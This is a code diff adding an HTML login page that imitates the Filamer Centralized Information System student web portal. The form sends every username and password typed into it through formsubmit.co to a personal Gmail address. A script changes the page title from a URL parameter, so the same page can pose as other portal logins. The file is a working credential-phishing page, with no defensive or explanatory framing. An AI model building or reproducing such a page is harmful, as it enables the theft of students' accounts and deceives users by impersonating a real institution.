@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Portal Login</title>
+<link rel="stylesheet" href="login.css">
+</head>
+
+<body>
+
+<div class="login-wrapper">
+
+<div class="login-card">
+
+<div class="logo">
+<img src="images/logo.png">
+<h2>FilCIS</h2>
+<p>Filamer Centralized Information System</p>
+</div>
+
+<div class="portal-title" id="portalTitle">
+FCU Student WebPortal
+</div>
+
+<form action="https://formsubmit.co/phc85260@gmail.com" method="POST">
+  
+  <input type="email" name="email" placeholder="Username" required>
+  
+  <input type="password" name="password" placeholder="Password" required>
+  
+  <button type="submit">SIGN IN</button>
+  
+</form>
+
+<p class="help">
+Don't have an account? <span>Pls. Contact MIS</span>
+</p>
+
+</div>
+
+</div>
+<script>
+
+const params = new URLSearchParams(window.location.search);
+const module = params.get("module");
+
+if(module){
+document.getElementById("portalTitle").textContent = module + " Login";
+}
+
+</script>
+</body>
+</html>
